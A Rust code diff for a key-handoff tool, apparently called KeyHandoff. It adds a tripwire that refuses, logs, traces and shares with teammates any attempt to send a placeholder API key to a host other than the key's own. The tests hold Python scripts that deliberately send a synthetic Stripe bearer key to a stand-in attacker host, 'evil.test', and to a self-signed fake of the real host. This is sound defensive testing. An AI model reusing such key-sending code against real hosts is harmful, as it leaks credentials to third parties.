@@ -20,7 +20,7 @@ use serde::{Deserialize, Serialize};
 use crate::os::{self, Captured, Clip, Peer};
 use crate::folder;
 use crate::nearby::{self, Nearby, OnObject};
-use crate::store::{Approval, Contact, FolderTeam, Role, Settings, Store, Team};
+use crate::store::{Alert, Approval, Contact, FolderTeam, Role, RunRecord, Settings, Store, Team, Tripwire};
 use rand_core::{OsRng, RngCore};
 use crate::vault::{Item, Keep, Vault};
 use zeroize::Zeroizing;
@@ -37,6 +37,8 @@ const INVITE_TTL: u64 = 30 * 24 * 60 * 60;
 const PAIRING_MS: u64 = 2 * 60 * 1000;
 /// A program waiting for Allow is refused after this long.
 pub const PROGRAM_TIMEOUT: Duration = Duration::from_secs(60);
+/// Runs and alerts the tripwire file keeps, newest last.
+const MAX_RUN_RECORDS: usize = 2000;
 /// How long "Allow for 30 minutes" lasts, for a command an AI agent started.
 const FOR_NOW_SECS: u64 = 30 * 60;
 
@@ -95,10 +97,13 @@ struct Run {
     token: [u8; 32],
     /// The runner's process: only it and processes it started may swap.
     runner: u32,
+    command: String,
+    started: u64,
     swaps: Vec<RunSwap>,
 }
 
 struct RunSwap {
+    label: String,
     placeholder: Zeroizing<String>,
     hosts: Vec<String>,
     ca: Option<PathBuf>,
@@ -166,6 +171,9 @@ struct Core {
     /// Programs running with placeholders. Locking drops them, and their
     /// placeholders stop being swapped.
     runs: Vec<Run>,
+    /// Every run's placeholders, the attempts to send one elsewhere, and the
+    /// destinations refused since.
+    tripwire: Tripwire,
     program: Option<ProgramAsk>,
     asks: u64,
 }
@@ -332,6 +340,23 @@ pub struct View {
     /// Nearby is on.
     pub nearby: bool,
     pub pairing: Option<PairingView>,
+    /// The latest attempt to send a placeholder somewhere else, until dismissed.
+    pub alert: Option<AlertView>,
+}
+
+/// A program tried to send a key's placeholder somewhere other than the
+/// key's servers, and KeyHandoff stopped it.
+#[derive(Serialize, Debug, Clone, PartialEq)]
+pub struct AlertView {
+    pub key: String,
+    pub command: String,
+    pub destination: String,
+    /// When, in Unix seconds.
+    pub at: u64,
+    /// When the run that tried started.
+    pub run_started: u64,
+    /// Teams whose folders now carry the warning.
+    pub shared_with: Vec<String>,
 }
 
 impl Handoff {
@@ -340,6 +365,7 @@ impl Handoff {
         let keyring = store.keyring()?;
         let vault = store.vault()?;
         let approvals = store.approvals()?;
+        let tripwire = store.tripwire()?;
         let contacts = store.contacts()?;
         let teams = store.teams()?;
         let folder_teams = store.folder_teams()?;
@@ -369,6 +395,7 @@ impl Handoff {
             approvals,
             for_now: Vec::new(),
             runs: Vec::new(),
+            tripwire,
             program: None,
             asks: 0,
         };
@@ -964,6 +991,10 @@ impl Handoff {
     }
 
     pub fn open_text(&self, text: &str) -> Result<(), String> {
+        if let Some(found) = self.trace(text) {
+            self.lock().notice = Some(found);
+            return Ok(());
+        }
         let bytes = armor::decode(text).map_err(|e| e.to_string())?;
         self.open_object(&bytes, None)
     }
@@ -981,7 +1012,7 @@ impl Handoff {
             Object::Bundle(bundle) => self.lock().accept_bundle(&bundle),
             Object::Invite(invite) => self.lock().invite(invite, from.and_then(Path::parent).map(Path::to_path_buf)),
             Object::Membership(_) => Err("This asks to join a team. The team's keeper picks it up from the team folder.".into()),
-            Object::TeamState(_) => Err("This is a team's own file. KeyHandoff reads it from the team folder.".into()),
+            Object::TeamState(_) | Object::Warning(_) => Err("This is a team's own file. KeyHandoff reads it from the team folder.".into()),
         }
     }
 
@@ -1173,6 +1204,10 @@ impl Handoff {
         core.added = None;
         core.notice = None;
         core.problem = None;
+        if core.tripwire.alerts.iter().any(|a| !a.seen) {
+            core.tripwire.alerts.iter_mut().for_each(|a| a.seen = true);
+            let _ = core.store.save_tripwire(&core.tripwire);
+        }
     }
 
     /// Report a problem the screens didn't ask about, such as a file that
@@ -1242,6 +1277,7 @@ impl Handoff {
     /// the program's TLS hook asks with when there's a placeholder.
     pub fn begin_run(&self, runner: &Peer, names: &[String], secrets: Vec<Secret>) -> (Vec<Secret>, Option<String>) {
         let mut core = self.lock();
+        let started = now();
         let mut values = Vec::with_capacity(secrets.len());
         let mut swaps = Vec::new();
         for (name, secret) in names.iter().zip(secrets) {
@@ -1254,7 +1290,8 @@ impl Handoff {
             match placeholder {
                 Some(placeholder) => {
                     values.push(Secret::new(placeholder.as_bytes().to_vec()));
-                    swaps.push(RunSwap { placeholder, hosts, ca: item.and_then(|i| i.ca.clone()), secret });
+                    let label = item.map(|i| i.label.clone()).unwrap_or_else(|| name.clone());
+                    swaps.push(RunSwap { label, placeholder, hosts, ca: item.and_then(|i| i.ca.clone()), secret });
                 }
                 None => values.push(secret),
             }
@@ -1264,7 +1301,18 @@ impl Handoff {
         }
         let mut token = [0u8; 32];
         OsRng.fill_bytes(&mut token);
-        core.runs.push(Run { token, runner: runner.pid, swaps });
+        let command = runner.command.clone().unwrap_or_else(|| display_name(&runner.program));
+        // The barcode: this run's placeholders, kept so one found later says where it came from.
+        core.tripwire.runs.push(RunRecord {
+            started,
+            command: command.clone(),
+            folder: runner.folder.as_deref().map(home_relative),
+            placeholders: swaps.iter().map(|s| (s.label.clone(), s.placeholder.to_string())).collect(),
+        });
+        let excess = core.tripwire.runs.len().saturating_sub(MAX_RUN_RECORDS);
+        core.tripwire.runs.drain(..excess);
+        let _ = core.store.save_tripwire(&core.tripwire);
+        core.runs.push(Run { token, runner: runner.pid, command, started, swaps });
         (values, Some(hex32(&token)))
     }
 
@@ -1273,12 +1321,55 @@ impl Handoff {
         self.lock().runs.retain(|r| hex32(&r.token) != token);
     }
 
-    /// For a TLS hook: its run's placeholders, the hosts each may go to, and
-    /// a private CA for them if the key has one.
-    pub fn hook_swaps(&self, token: &str, asker: &Peer) -> Result<Vec<(Zeroizing<String>, Vec<String>, Option<PathBuf>)>, String> {
+    /// For a TLS hook: its run's placeholders, the hosts each may go to and
+    /// a private CA for them if the key has one; and the destinations to
+    /// refuse, yours and your teams' warnings.
+    #[allow(clippy::type_complexity)]
+    pub fn hook_swaps(&self, token: &str, asker: &Peer) -> Result<(Vec<(Zeroizing<String>, Vec<String>, Option<PathBuf>)>, Vec<String>), String> {
         let core = self.lock();
         let run = core.run_for(token, asker)?;
-        Ok(run.swaps.iter().map(|s| (s.placeholder.clone(), s.hosts.clone(), s.ca.clone())).collect())
+        let swaps = run.swaps.iter().map(|s| (s.placeholder.clone(), s.hosts.clone(), s.ca.clone())).collect();
+        Ok((swaps, core.blocked()))
+    }
+
+    /// A TLS hook stopped `placeholder` going to `destination`: remember the
+    /// destination, show the alert, and warn every team folder you're in.
+    pub fn alert(&self, token: &str, asker: &Peer, placeholder: &str, destination: &str) -> Result<(), String> {
+        let destination: String = destination.chars().filter(|c| !c.is_control()).take(keyhandoff_seal::MAX_DESTINATION_BYTES).collect();
+        if destination.is_empty() {
+            return Err("no destination".into());
+        }
+        {
+            let mut core = self.lock();
+            let run = core.run_for(token, asker)?;
+            let swap = run.swaps.iter().find(|s| s.placeholder.as_str() == placeholder).ok_or("not a placeholder of this run")?;
+            let alert = Alert { at: now(), key: swap.label.clone(), command: run.command.clone(), destination: destination.clone(), run_started: run.started, seen: false };
+            let culprit: String = run.command.chars().take(keyhandoff_seal::MAX_CULPRIT_BYTES / 4).collect();
+            core.tripwire.alerts.push(alert);
+            let excess = core.tripwire.alerts.len().saturating_sub(MAX_RUN_RECORDS);
+            core.tripwire.alerts.drain(..excess);
+            if !core.tripwire.blocked.contains(&destination) {
+                core.tripwire.blocked.push(destination.clone());
+            }
+            core.store.save_tripwire(&core.tripwire)?;
+            for team in &core.folder_teams {
+                if let Ok(warning) = keyhandoff_seal::warn(&core.identity, team.id, &destination, &culprit, now()) {
+                    let _ = folder::write_warning(&team.folder, &warning);
+                }
+            }
+        }
+        (self.notify)();
+        Ok(())
+    }
+
+    /// Where a placeholder in `text` came from, if it holds one of a run's
+    /// stand-ins: which key, which command, and when.
+    pub fn trace(&self, text: &str) -> Option<String> {
+        let core = self.lock();
+        core.tripwire.runs.iter().rev().find_map(|run| {
+            let (label, _) = run.placeholders.iter().find(|(_, p)| text.contains(p.as_str()))?;
+            Some(format!("That's the stand-in for {label} that {} got on {}. It was never the key.", run.command, when(run.started)))
+        })
     }
 
     /// For a TLS hook that verified a connection to `host`: the key behind
@@ -1622,6 +1713,26 @@ impl Core {
         ContactView { id: hex32(&c.identity), name: c.name.clone(), computer, sends_left: c.locks.len(), nearby }
     }
 
+    /// Destinations to refuse: ones your programs tried to send a placeholder
+    /// to, and ones in warnings from people on your team folders' latest
+    /// versions (the keeper and its members), checked by signature.
+    fn blocked(&self) -> Vec<String> {
+        let mut blocked = self.tripwire.blocked.clone();
+        for team in &self.folder_teams {
+            let Some(state) = folder::state(&team.folder) else { continue };
+            if state.team_id() != team.id || *state.keeper().as_bytes() != team.keeper {
+                continue;
+            }
+            let on_team = |who: &keyhandoff_seal::PublicIdentity| who == &state.keeper() || state.members().iter().any(|m| &m.identity == who);
+            for warning in folder::warnings(&team.folder) {
+                if warning.team_id() == team.id && on_team(&warning.reporter()) && !blocked.iter().any(|b| b == warning.destination()) {
+                    blocked.push(warning.destination().to_string());
+                }
+            }
+        }
+        blocked
+    }
+
     /// The run with `token`, if `asker` is its runner or was started by it.
     fn run_for(&self, token: &str, asker: &Peer) -> Result<&Run, String> {
         let run = self.runs.iter().find(|r| hex32(&r.token) == token).ok_or("this run has ended")?;
@@ -1730,6 +1841,14 @@ impl Core {
             folder_teams: self.folder_teams.iter().map(|t| self.folder_team_view(t)).collect(),
             nearby: self.nearby.is_some(),
             pairing: self.pairing.as_ref().map(|p| self.pairing_view(p)),
+            alert: self.tripwire.alerts.iter().rev().find(|a| !a.seen).map(|a| AlertView {
+                key: a.key.clone(),
+                command: a.command.clone(),
+                destination: a.destination.clone(),
+                at: a.at,
+                run_started: a.run_started,
+                shared_with: self.folder_teams.iter().map(|t| t.name.clone()).collect(),
+            }),
             invited: self.invited.as_ref().map(|(invite, folder)| InviteView {
                 team: invite.team().to_string(),
                 keeper: invite.keeper_name().to_string(),
@@ -1854,6 +1973,22 @@ fn take_team_keys(
 
 fn now() -> u64 {
     SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
+}
+
+/// A Unix time as UTC, `2026-11-01 01:40`, for messages.
+fn when(t: u64) -> String {
+    let (days, secs) = (t / 86_400, t % 86_400);
+    // Civil from days (Howard Hinnant's algorithm).
+    let z = days as i64 + 719_468;
+    let era = z.div_euclid(146_097);
+    let doe = z - era * 146_097;
+    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
+    let mp = (5 * doy + 2) / 153;
+    let d = doy - (153 * mp + 2) / 5 + 1;
+    let m = if mp < 10 { mp + 3 } else { mp - 9 };
+    let y = yoe + era * 400 + i64::from(m <= 2);
+    format!("{y}-{m:02}-{d:02} {:02}:{:02} UTC", secs / 3600, secs % 3600 / 60)
 }
 
 fn now_ms() -> u64 {
@@ -2877,11 +3012,11 @@ while True:
 
     /// FEAT-09's check: under `keyhandoff run`, a Python program holding only
     /// a placeholder sends the same request to a server verified as the key's
-    /// host, which gets the real key, and to others, which get the
-    /// placeholder: one with a valid certificate for another name, the same
-    /// one with the key's host claimed in SNI, and one with a self-signed
-    /// certificate for the key's host. The program's environment never holds
-    /// the key.
+    /// host, which gets the real key, and to others, which get neither key
+    /// nor placeholder (FEAT-10 refuses the write): one with a valid
+    /// certificate for another name, the same one with the key's host claimed
+    /// in SNI, and one with a self-signed certificate for the key's host. The
+    /// program's environment never holds the key.
     #[cfg(target_os = "linux")]
     #[test]
     fn keyhandoff_run_swaps_the_key_in_only_for_its_verified_host() {
@@ -2916,9 +3051,12 @@ def send(port, name, verify=True):
     ctx = ssl.create_default_context(cafile="ca.pem")
     if not verify:
         ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-    with ctx.wrap_socket(socket.create_connection(("127.0.0.1", port)), server_hostname=name) as t:
-        t.sendall(("POST /v1/charges HTTP/1.1\r\nHost: " + name + "\r\nAuthorization: Bearer " + key + "\r\n\r\n").encode())
-        print(name, t.recv(100)[:15])
+    try:
+        with ctx.wrap_socket(socket.create_connection(("127.0.0.1", port)), server_hostname=name) as t:
+            t.sendall(("POST /v1/charges HTTP/1.1\r\nHost: " + name + "\r\nAuthorization: Bearer " + key + "\r\n\r\n").encode())
+            print(name, t.recv(100)[:15])
+    except OSError as e:
+        print(name, "refused", type(e).__name__)
 send({good}, "api.stripe.test")
 send({evil}, "evil.test")
 send({evil}, "api.stripe.test", verify=False)
@@ -2942,11 +3080,11 @@ send({fake}, "api.stripe.test", verify=False)
         let contains = |hay: &[u8], needle: &[u8]| hay.windows(needle.len()).any(|w| w == needle);
         let good = got("api.stripe.test.got");
         assert!(contains(&good, &[b"Bearer ".as_slice(), STRIPE].concat()), "the key's server gets the key: {}", String::from_utf8_lossy(&good));
-        let evil = got("evil.test.got");
-        assert_eq!(evil.split(|&b| b == b'\n').filter(|l| l.starts_with(b"Authorization")).count(), 2, "{}", String::from_utf8_lossy(&evil));
-        assert!(contains(&evil, &placeholder) && !contains(&evil, STRIPE), "another server gets the placeholder");
-        let fake = got("self_api.stripe.test.got");
-        assert!(contains(&fake, &placeholder) && !contains(&fake, STRIPE), "a self-signed api.stripe.test gets the placeholder");
+        for (file, what) in [("evil.test.got", "another server"), ("self_api.stripe.test.got", "a self-signed api.stripe.test")] {
+            let other = got(file);
+            assert!(!contains(&other, STRIPE) && !contains(&other, &placeholder) && !contains(&other, b"Authorization"), "{what} gets nothing: {}", String::from_utf8_lossy(&other));
+        }
+        assert_eq!(text.matches("refused").count(), 3, "{text}");
         assert!(!contains(&got("seen-env"), STRIPE), "the program's environment never holds the key");
         let ended = (0..200).any(|_| {
             std::thread::sleep(Duration::from_millis(10));
@@ -2955,6 +3093,124 @@ send({fake}, "api.stripe.test", verify=False)
         assert!(ended, "the run ended with the runner");
         drop(servers);
         let _ = fs::remove_dir_all(me.data);
+    }
+
+    /// FEAT-10's check: two runs of a script get different placeholders;
+    /// each sends to the key's server (which gets the real key) and to
+    /// another (which gets nothing); KeyHandoff keeps an alert for each,
+    /// naming its command and the destination, and traces either placeholder
+    /// back to its run; and a teammate on the same team folder, whose
+    /// program sends no key at all, is refused that destination.
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn a_leaked_placeholder_is_blocked_traced_and_refused_for_the_team() {
+        use crate::run::tests::{finished, start};
+        use std::process::Command;
+        const STRIPE: &[u8] = b"sk_test_51SyntheticTripwireKey0123456789abcdXYZ";
+        if ["python3", "openssl", "setsid"].iter().any(|p| Command::new(p).arg("version").output().is_err()) {
+            eprintln!("skipped: needs python3, openssl and setsid");
+            return;
+        }
+        let (ann, ben) = (app("Ann"), app("Ben"));
+        let shared = temp("tripwire-team");
+        fs::create_dir_all(&shared).unwrap();
+        let team = ben.handoff.make_folder_team("Platform", &shared).unwrap();
+        ann.handoff.open_path(&shared.join("invite.handoff")).unwrap();
+        ann.handoff.join_team(None).unwrap();
+        let asking = ben.handoff.view().folder_teams[0].asking[0].id.clone();
+        ben.handoff.add_to_team(&team, &asking).unwrap();
+        assert!(!ann.handoff.view().folder_teams[0].waiting);
+
+        let project = ann.data.join("project");
+        fs::create_dir_all(&project).unwrap();
+        let project = project.canonicalize().unwrap();
+        let servers = TlsServers::start(&project, &["api.stripe.test", "evil.test"]).expect("test TLS servers");
+        let mut profiles = Vec::new();
+        for who in [&ann, &ben] {
+            let mut core = who.handoff.lock();
+            let id = core.vault.add("Stripe", None, None, &Secret::new(STRIPE.to_vec()), Keep::Forever, now());
+            core.vault.set_hosts(id, vec!["api.stripe.test".into()], Some(servers.ca.clone()));
+            drop(core);
+            let profile = format!("test-{}", OsRng.next_u32());
+            let served = who.handoff.clone();
+            os::listen_for_keys(&profile, Arc::new(move |peer, stream| crate::pointer::serve(&served, &peer, stream))).unwrap();
+            profiles.push(profile);
+        }
+        fs::write(project.join(".env"), "STRIPE_API_KEY=handoff:Stripe\n").unwrap();
+        let script = format!(
+            r#"import os, socket, ssl, sys
+key = os.environ["STRIPE_API_KEY"]
+tag = sys.argv[1]
+open("seen-" + tag, "w").write(key)
+def send(port, name, auth):
+    ctx = ssl.create_default_context(cafile="ca.pem")
+    try:
+        with ctx.wrap_socket(socket.create_connection(("127.0.0.1", port)), server_hostname=name) as t:
+            t.sendall(("GET /" + tag + " HTTP/1.1\r\nHost: " + name + "\r\n" + auth + "\r\n").encode())
+            print(name, t.recv(100)[:15])
+    except OSError as e:
+        print(name, "refused")
+if tag == "ben":
+    send({evil}, "evil.test", "X-Note: no key here\r\n")
+else:
+    send({good}, "api.stripe.test", "Authorization: Bearer " + key + "\r\n")
+    send({evil}, "evil.test", "Authorization: Bearer " + key + "\r\n")
+"#,
+            good = servers.ports[0],
+            evil = servers.ports[1]
+        );
+        fs::write(project.join("pay.py"), script).unwrap();
+        let run = |who: &App, profile: &str, tag: &str, ask: bool| {
+            let out = start(&project, profile, &["python3", "pay.py", tag], None);
+            if ask {
+                answer_when_asked(&who.handoff, Answer::Once);
+            }
+            finished(&out)
+        };
+
+        // Two runs on Ann's computer, each with its own placeholder.
+        for tag in ["first", "second"] {
+            let (text, code) = run(&ann, &profiles[0], tag, true);
+            assert_eq!(code, 0, "{text}");
+            assert!(text.contains("api.stripe.test b'HTTP/1.1 200 OK'") && text.contains("evil.test refused"), "{text}");
+            assert!(text.contains("KeyHandoff stopped a key's stand-in going to evil.test"), "{text}");
+        }
+        let read = |file: &str| fs::read(project.join(file)).unwrap_or_default();
+        let (first, second) = (read("seen-first"), read("seen-second"));
+        assert!(first != second && first.len() == STRIPE.len() && first != STRIPE, "a fresh placeholder per run");
+        let contains = |hay: &[u8], needle: &[u8]| hay.windows(needle.len()).any(|w| w == needle);
+        let good = read("api.stripe.test.got");
+        assert_eq!(good.windows(STRIPE.len()).filter(|w| *w == STRIPE).count(), 2, "the key's server got the key both times");
+        let evil = read("evil.test.got");
+        assert!(!contains(&evil, b"GET") && !contains(&evil, STRIPE) && !contains(&evil, &first), "the other server got nothing: {}", String::from_utf8_lossy(&evil));
+
+        // An alert for each run, naming its command and the destination, and a trace for each placeholder.
+        let alerts: Vec<_> = ann.handoff.lock().tripwire.alerts.iter().map(|a| (a.command.clone(), a.destination.clone(), a.key.clone())).collect();
+        assert_eq!(
+            alerts,
+            [("python3 pay.py first", "evil.test", "Stripe"), ("python3 pay.py second", "evil.test", "Stripe")].map(|(c, d, k)| (c.to_string(), d.to_string(), k.to_string()))
+        );
+        assert_eq!(ann.handoff.view().alert.unwrap().command, "python3 pay.py second");
+        let found = ann.handoff.trace(&format!("log line: token={}", String::from_utf8_lossy(&first))).unwrap();
+        assert!(found.contains("Stripe") && found.contains("python3 pay.py first"), "{found}");
+        assert!(ann.handoff.trace("nothing here").is_none());
+        ann.handoff.dismiss();
+        assert!(ann.handoff.view().alert.is_none());
+
+        // Ben, on the same team folder, is refused evil.test even sending no key.
+        let (text, code) = run(&ben, &profiles[1], "ben", true);
+        assert_eq!(code, 0, "{text}");
+        assert!(text.contains("evil.test refused") && text.contains("KeyHandoff refused a connection to evil.test"), "{text}");
+        assert!(!contains(&read("evil.test.got"), b"GET /ben"), "evil.test got nothing from Ben");
+        assert!(ben.handoff.lock().tripwire.alerts.is_empty(), "nothing of Ben's leaked");
+
+        drop(servers);
+        for p in &profiles {
+            let _ = fs::remove_file(os::runtime_dir().join(format!("handoff-{p}-keys.sock")));
+        }
+        let _ = fs::remove_dir_all(shared);
+        let _ = fs::remove_dir_all(ann.data);
+        let _ = fs::remove_dir_all(ben.data);
     }
 
     #[test]
